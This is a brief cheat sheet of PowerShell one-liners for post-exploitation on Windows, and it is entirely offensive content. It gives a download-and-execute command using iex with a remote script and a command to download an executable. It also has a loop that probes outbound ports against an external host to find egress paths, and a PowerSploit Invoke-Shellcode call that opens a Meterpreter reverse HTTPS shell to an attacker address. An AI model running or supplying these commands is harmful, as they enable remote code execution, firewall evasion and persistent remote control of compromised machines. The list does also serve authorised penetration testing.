# Windows Powershell Commands and Scripts for Post Exploitation

One liners
-----------

**Download and Execute Remote Powershell Script**

```iex (New-Object Net.WebClient).DownloadString("http://host/file.txt")```

**Download and Save File**

```(new-object System.Net.WebClient).Downloadfile('http://host/file.exe', 'file.exe')```

**Enumerate Allowed Outbound Ports 1-1024**

```$ErrorActionPreference = "silentlycontinue"; 1..1024 | % {$req = [System.Net.WebRequest]::Create("http://letmeoutofyour.net:$_"); $req.Timeout = 600; $resp = $req.GetResponse(); $respstream = $resp.GetResponseStream(); 
$stream = new-object System.IO.StreamReader $respstream; $out = $stream.ReadToEnd(); if ($out.trim() -eq "w00tw00t"){echo "$_ Allowed out"}}```

**Reverse Shell Using [PowerSploit's Invoke-Shellcode](https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1)**

```Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.10 -Lport 443 -Force```